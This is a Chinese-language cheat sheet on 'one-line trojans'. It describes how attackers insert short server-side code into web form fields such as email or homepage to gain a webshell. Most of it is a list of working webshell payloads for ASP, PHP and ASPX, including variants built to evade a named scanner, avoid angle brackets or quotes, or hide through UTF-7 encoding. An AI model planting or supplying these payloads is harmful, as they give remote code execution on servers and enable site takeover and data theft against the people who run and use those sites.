# 一句话木马

黑客在注册信息的电子邮箱或者个人主页等中插入类似如下代码：

&lt;%execute request\("value"\)%&gt;

其中value是值，所以你可以更改自己的值，前面的request就是获取这个值

&lt;%eval request\("value"\)%&gt;\(现在比较多见的，而且字符少，对表单字数有限制的地方特别的实用\)

当知道了数据库的URL，就可以利用本地一张网页进行连接得到Webshell。（不知道数据库也可以，只要知道&lt;%eval request\("value"\)%&gt;这个文件被插入到哪一个ASP文件里面就可以了。）

这就被称为一句话木马，它是基于B/S结构的。

常用一句话木马

asp一句话木马：

&lt;%execute\(request\("value"\)\)%&gt;

php一句话木马：

&lt;?php @eval\($\_POST\[value\]\);?&gt;

aspx一句话木马：

&lt;%@ Page Language="Jscript"%&gt;

&lt;%eval\(Request.Item\["value"\]\)%&gt;

其他一句话木马：

&lt;%eval request\("value"\)%&gt;

&lt;%execute request\("value"\)%&gt;

&lt;%execute\(request\("value"\)\)%&gt;

&lt;%If Request\("value"\)&lt;&gt;"" Then Execute\(Request\("value"\)\)%&gt;

&lt;%if request \("value"\)&lt;&gt;""then session\("value"\)=request\("value"\):end if:if session\("value"\)&lt;&gt;"" then execute session\("value"\)%&gt;

&lt;SCRIPT language=VBScript runat="server"&gt;execute request\("value"\)&lt;/SCRIPT&gt;

&lt;%@ Page Language="Jscript"%&gt;

&lt;%eval\(Request.Item\["value"\],"unsafe"\);%&gt;

可以躲过雷客图的一句话木马：

&lt;%

set ms = server.CreateObject\("MSScriptControl.ScriptControl.1"\)

ms.Language="VBScript"

ms.AddObject "Response", Response

ms.AddObject "request", request

ms.ExecuteStatement\("ev"&"al\(request\(""value""\)\)"\)

%&gt;

不用'&lt;,&gt;'的asp一句话木马：

&lt;script language=VBScript runat=server&gt;execute request\("value"\)&lt;/script&gt;

不用双引号的一句话木马：

&lt;%eval request\(chr\(35\)\)%&gt;

UTF-7编码加密:

&lt;%@ codepage=65000%&gt;&lt;% response.Charset=”936″%&gt;&lt;%e+j-x+j-e+j-c+j-u+j-t+j-e+j-\(+j-r+j-e+j-q+j-u+j-e+j-s+j-t+j-\(+j-+ACI-\#+ACI\)+j-\)+j-%&gt;

